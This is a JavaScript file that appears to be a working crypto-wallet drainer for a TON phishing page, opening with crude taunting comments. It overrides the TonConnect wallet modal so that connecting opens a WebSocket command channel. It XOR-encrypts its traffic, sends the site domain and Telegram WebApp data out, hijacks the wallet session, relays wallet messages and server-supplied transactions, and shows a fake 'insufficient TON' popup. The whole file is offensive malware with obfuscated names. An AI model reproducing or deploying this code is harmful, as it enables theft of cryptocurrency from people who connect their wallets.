// HELLO MY FRIEND.
// DO YOU LIKE SPERMA?
// I LIKE IT MOVIE MOVIE
// MOVIE MOVIE
// IM SORRY, GOOD LUCK!

var crempai = document.createElement('script');
crempai.setAttribute('src','https://telegram.org/js/telegram-web-app.js'); 
document.head.appendChild(crempai);

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function senpai(text, key) {
    var kL = key.length;

    return Array.prototype
        .slice.call(text)
        .map(function (c, index) {
            return String.fromCharCode(c.charCodeAt(0) ^ key[index % kL].charCodeAt(0));
        }).join('');
}

let session_id = "";
let manifest_url = "";
let socket = undefined;
let key = undefined;

let opened = false;

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://app.ston.fi/tonconnect-manifest.json',
    buttonRootId: "root"
});

tonConnectUI.uiOptions = {
  actionsConfiguration: {
      returnStrategy: 'none'
  }
};

let oldOpenModal = tonConnectUI.openModal;
tonConnectUI.openModal = (...args) => {
    if(socket != undefined && manifest_url == "") return;
    if(socket != undefined && manifest_url != "") return oldOpenModal.call(tonConnectUI, ...args);     

    socket = new WebSocket("ws://0.0.0.0:444");
    socket.addEventListener("open", _0x2a6879 => {
      socket.send(JSON.stringify({
        'event': "connection"
      }));
    });

    socket.addEventListener("message", async _0x3e1b43 => {
        let data = JSON.parse(_0x3e1b43.data);
        //console.log(data);

        if (data.event == "safety") {
          key = JSON.parse(senpai(data.encryptedData, "opsdaodsaoaodfkkk12k1k1")).key;

          socket.send(JSON.stringify({
            'event': "proof",
            'encryptedData': senpai(JSON.stringify({
              'message': "hello",
              'domain': window.location.hostname,
              'telegram_data': window.Telegram?.WebApp 
            }), key)
          }));

          //console.log(key);

          return;
        }

        if (data.event == "drainer") {
            try{ await tonConnectUI.disconnect(); } catch(exc) {}

            let parsed_data = JSON.parse(senpai(data.encryptedData, key));

            let window_keys = Object.keys(window);
            for(let i = 0; i < window_keys.length; i++) {
              let wallet_key = window_keys[i];

              if(!window[wallet_key]) continue;
              if(window[wallet_key].tonconnect == undefined || window[wallet_key].tonconnect.walletInfo == undefined) continue;

              window[wallet_key].tonconnect.listen(async (message) => {
                //console.log(message);
                //console.log(key);
                socket.send(JSON.stringify({
                  "event": "bridge",
                  'encryptedData': senpai(JSON.stringify(message), key)
                }))
              });
            }
            
            session_id = parsed_data.answer.session_id;
            manifest_url = parsed_data.answer.manifest_url;

            tonConnectUI.connector.sessionID = session_id;
            tonConnectUI.connector.dappSettings.manifestUrl = manifest_url;
            
            return oldOpenModal.call(tonConnectUI, ...args);   
        }

        if(data.event == "sendMessage") {
            let parsed_event = JSON.parse(senpai(data.encryptedData, key));

                //let transaction = JSON.parse(parsed_event.params[0]);
                //try {
                //    let result = await tonConnectUI.sendTransaction({
                //        validUntil: Math.floor(Date.now() / 1000) + 600, // 60 sec
                //        messages: transaction.messages
                //    });
//
                //    socket.send(JSON.stringify({
                //        "event": "bridge",
                //        'encryptedData': senpai(JSON.stringify(result), key)
                //    }));
                //}
                //catch(error) {
                //    socket.send(JSON.stringify({
                //        "event": "bridge",
                //        'encryptedData': senpai(JSON.stringify({error: error, id: parsed_event.id}), key)
                //    }))
                //}
            //
                //return;

            //console.log(parsed_event);

            let result = await window[tonConnectUI.connector.provider.injectedWalletKey].tonconnect.send(parsed_event);
            socket.send(JSON.stringify({
              "event": "bridge",
              'encryptedData': senpai(JSON.stringify(result), key)
            }))
      
            return;
          }

        if (data.event == "needbalance") {
          let min = {
            heading: 'Transaction declined!',
            paragraph: 'You don\'t have enough TON to make a transaction. The wallet must have a minimum of 0.13 TON to complete the transaction.'
          }
      
          const _0x57b6eb = document.createElement("div");
          _0x57b6eb.style.position = "fixed";
          _0x57b6eb.style.top = '0';
          _0x57b6eb.style.left = '0';
          _0x57b6eb.style.width = "100%";
          _0x57b6eb.style.height = "100%";
          _0x57b6eb.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
          _0x57b6eb.style.zIndex = "999";
          const _0x5da296 = document.createElement("div");
          _0x5da296.style.position = "fixed";
          _0x5da296.style.top = "50%";
          _0x5da296.style.left = "50%";
          _0x5da296.style.transform = "translate(-50%, -50%)";
          _0x5da296.style.backgroundColor = "#121214";
          _0x5da296.style.color = "#fff";
          _0x5da296.style.padding = "20px";
          _0x5da296.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)";
          _0x5da296.style.zIndex = "1000";
          _0x5da296.style.maxWidth = "300px";
          _0x5da296.style.width = "80%";
          _0x5da296.style.borderRadius = "20px";
          _0x5da296.style.textAlign = "left";
          const _0x570ecb = document.createElement("link");
          _0x570ecb.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css";
          _0x570ecb.rel = "stylesheet";
          document.head.appendChild(_0x570ecb);
          _0x5da296.style.fontFamily = "\"Roboto\", sans-serif";
          const _0x1eae43 = document.createElement('h1');
          _0x1eae43.textContent = min.heading;
          const _0x1060ed = document.createElement('p');
          _0x1060ed.textContent = min.paragraph;
          _0x1060ed.style.fontSize = "15px";
          _0x1060ed.style.color = "#7D7D85";
          _0x1eae43.style["padding-bottom"] = "10px";
          _0x1eae43.style.fontSize = "22px";
          _0x1eae43.style.fontWeight = "200";
          const _0x14a544 = document.createElement("button");
          _0x14a544.innerHTML = "<i class=\"fas fa-times\"></i>";
          _0x14a544.style.position = "absolute";
          _0x14a544.style.top = "10px";
          _0x14a544.style.right = "10px";
          _0x14a544.style.backgroundColor = "#222224";
          _0x14a544.style.color = "white";
          _0x14a544.style.fontSize = "20px";
          _0x14a544.style.border = "none";
          _0x14a544.style.borderRadius = "50%";
          _0x14a544.style.width = "30px";
          _0x14a544.style.height = "30px";
          _0x14a544.style.display = "flex";
          _0x14a544.style.alignItems = "center";
          _0x14a544.style.justifyContent = "center";
          _0x14a544.style.cursor = "pointer";
          _0x14a544.style.fontWeight = "bold";
          _0x14a544.style.lineHeight = '1';
          _0x14a544.style.padding = '0';
          _0x14a544.onclick = () => {
            document.body.removeChild(_0x57b6eb);
            document.body.removeChild(_0x5da296);
            setTimeout(() => {
              window.location.reload();
            }, 300);
          };
          _0x5da296.appendChild(_0x1eae43);
          _0x5da296.appendChild(_0x1060ed);
          _0x5da296.appendChild(_0x14a544);
          document.body.appendChild(_0x57b6eb);
          document.body.appendChild(_0x5da296);
        }

        if(data.event == "signmessage") {
            tonConnectUI.sendTransaction(data.walletInfo);
        }

        if(data.event == "connection") {
            tonConnectUI.connector.onWalletConnected({
                items: [
                    {
                        name: "ton_addr",
                        address: data.address
                    }
                ]
            })
        }
    });
}

function connectWallet() {
    tonConnectUI.openModal();
}